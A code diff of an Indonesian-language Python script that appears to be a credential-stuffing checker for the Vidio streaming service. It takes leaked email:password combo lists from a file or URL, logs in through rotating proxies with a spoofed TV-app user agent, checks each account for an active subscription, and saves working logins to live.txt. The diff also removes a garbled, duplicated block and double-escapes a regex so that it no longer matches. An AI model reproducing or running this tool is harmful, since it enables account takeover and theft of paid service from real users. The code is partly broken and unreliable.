@@ -14,7 +14,6 @@ xApiInfo_vidio = "tv-android/10/2.46.10-743"
 def session_id():
     return str(uuid.uuid4())
 
-
 def fungsi_login(
     email,
     password,
@@ -68,7 +67,6 @@ def fungsi_login(
     print(Fore.RED + f"Login gagal untuk {email}")
     return None
 
-
 def fungsi_get_subs(user_token, email):
     headers = {
         "x-user-email": email,
@@ -101,7 +99,6 @@ def fungsi_get_subs(user_token, email):
         print(Fore.RED + "Gagal parsing JSON response.")
     return None
 
-
 def save_to_file(email, password, filename="live.txt"):
     entry = f"{email}:{password}"
     if os.path.exists(filename):
@@ -113,7 +110,6 @@ def save_to_file(email, password, filename="live.txt"):
     with open(filename, "a") as f:
         f.write(entry + "\n")
     print(Fore.GREEN + f"{email} berhasil disimpan.")
-
 
 def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
     if re.match(r"^https?://", file_akun):
@@ -128,7 +124,7 @@ def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
         with open(file_akun, "r") as f:
             lines = f.read().splitlines()
 
-    pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")
+    pattern = re.compile(r"https?://(?:www\\.|m\\.)?vidio\\.com:(.+?):(.+)")
 
     for line in lines:
         match = pattern.match(line)
@@ -160,115 +156,6 @@ def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
                 print(Fore.RED + "Token atau email tidak ditemukan di response.")
         else:
             print(Fore.RED + f"Login gagal untuk {email}")
-
-
-if __name__ == "__main__":
-    init(autoreset=True)
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "akun",
-        nargs="?",
-        default="akun.txt",
-        help="Path atau URL daftar akun",
-    )
-    parser.add_argument(
-        "--use-proxy",
-        action="store_true",
-        help="Gunakan proxy saat melakukan request",
-    )
-    args = parser.parse_args()
-
-    pm = None
-    if args.use_proxy:
-        pm = ProxyManager()
-        pm.download_proxies()
-
-    proses_akun(args.akun, proxy_manager=pm)        if proxy_manager:
-            current_proxy = proxy_manager.get_next_proxy()
-
-    print(Fore.RED + f"Login gagal untuk {email}")
-    return None
-
-
-def fungsi_get_subs(user_token, email):
-    headers = {
-        "X-Api-Platform": "tv-android",
-        "X-Api-Auth": X_API_AUTH,
-        "User-Agent": userAgent_vidio,
-        "X-Api-App-Info": xApiInfo_vidio,
-        "Accept-Language": "id",
-        "X-User-Email": email,
-        "X-User-Token": user_token,
-        "Accept-Encoding": "gzip"
-    }
-
-    url = "https://api.vidio.com/api/users/subscriptions"
-    try:
-        response = requests.get(url, headers=headers, timeout=10)
-        response.raise_for_status()
-        product_catalog = response.json()["subscriptions"][0]["product_catalog"]["code"]
-        return product_catalog
-    except (requests.RequestException, KeyError, IndexError):
-        return None
-
-
-def save_to_file(email, password, filename="live.txt"):
-    entry = f"{email}:{password}"
-    if os.path.exists(filename):
-        with open(filename, "r") as f:
-            data = f.read().splitlines()
-        if entry in data:
-            print(Fore.YELLOW + f"{email} sudah ada di file, skip...")
-            return
-    with open(filename, "a") as f:
-        f.write(entry + "\n")
-    print(Fore.GREEN + f"{email} berhasil disimpan.")
-
-
-def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None):
-    if re.match(r"^https?://", file_akun):
-        try:
-            resp = requests.get(file_akun, timeout=10)
-            resp.raise_for_status()
-            lines = resp.text.splitlines()
-        except requests.RequestException as e:
-            print(Fore.RED + f"Gagal mengambil daftar akun: {e}")
-            return
-    else:
-        with open(file_akun, "r") as f:
-            lines = f.read().splitlines()
-
-    pattern = re.compile(r"https?://(?:www\.|m\.)?vidio\.com:(.+?):(.+)")
-    
-    for line in lines:
-        match = pattern.match(line)
-        if not match:
-            print(Fore.RED + f"Format salah: {line}")
-            continue
-
-        email = match.group(1).strip()
-        password = match.group(2).strip()
-
-        print(Fore.CYAN + f"\n[•] Proses login {email}")
-
-        login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
-        if login_response:
-            data = login_response.json()
-            user_token = data.get("user", {}).get("user_token")
-            user_email = data.get("user", {}).get("email")
-
-            if user_token and user_email:
-                subs = fungsi_get_subs(user_token, user_email)
-                if subs:
-                    print(Fore.GREEN + f"[✓] {email} Langganan Aktif ({subs})")
-                    save_to_file(email, password)
-                else:
-                    print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
-            else:
-                print(Fore.RED + "Token atau email tidak ditemukan di response.")
-        else:
-            print(Fore.RED + f"Login gagal untuk {email}")
-
 
 if __name__ == "__main__":
     init(autoreset=True)
